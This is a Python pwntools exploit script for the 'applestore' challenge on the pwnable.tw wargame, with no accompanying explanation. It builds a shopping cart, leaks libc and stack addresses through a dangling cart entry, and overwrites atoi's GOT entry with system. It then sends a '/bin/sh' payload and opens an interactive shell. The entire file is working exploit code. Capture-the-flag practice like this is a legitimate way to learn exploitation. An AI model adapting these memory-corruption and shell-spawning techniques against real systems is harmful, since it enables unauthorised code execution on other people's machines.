#!/usr/bin/env python3
from pwn import *

exe = ELF("applestoree")
ld = ELF("ld-2.23.so")
libc = ELF("./libc.so.6")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("chall.pwnable.tw", 10104)
else:
    p = process([exe.path])
    input()
    # gdb.attach(p,"""
    #     source ./break
    #
    #            """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

def add(num):
    sla(b">",b"2")
    sla(b">",str(num).encode())
def cart(data):
    sla(b">",b"4")
    sla(b"y",data)
def check(data):
    sla(b">",b"5")
    sla(b"y",data)
def delete(idx):
    sla(b">",b"3")
    sla(b"Item Number>",idx)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)




for i in range(3):
    add(3)
for i in range(11):
    add(2)
    add(1)
add(1)
check(b"y" )
cart(b"yy" + p32(exe.got.atoi) + p32(0x1))
p.recvuntil(b"27: ")
leak = u32(p.recv(4))
libc.address = leak - 184400
log.info(f"libc: {hex(leak)}")
log.info(f"libc base: {hex(libc.address)}")
cart(b"yy" + p32(libc.sym.environ) + p32(0x1))
p.recvuntil(b"27: ")
leak = u32(p.recv(4))
stack = leak
pop_ebx = libc.address+0x00018395
rbp = stack-260
log.info(f"rbp: {hex(rbp)}")
log.info(f"stack: {hex(leak)}")
delete(b"27" + p32(pop_ebx)+p32(0x43)+p32(exe.got.atoi+0x22)+p32(rbp-0x8))
log.info(f"stdout: {hex(exe.sym.stdout)}")
sa(b">",p32(libc.sym.system)+b";/bin/sh\0;")



p.interactive()
# good luck pwning :)

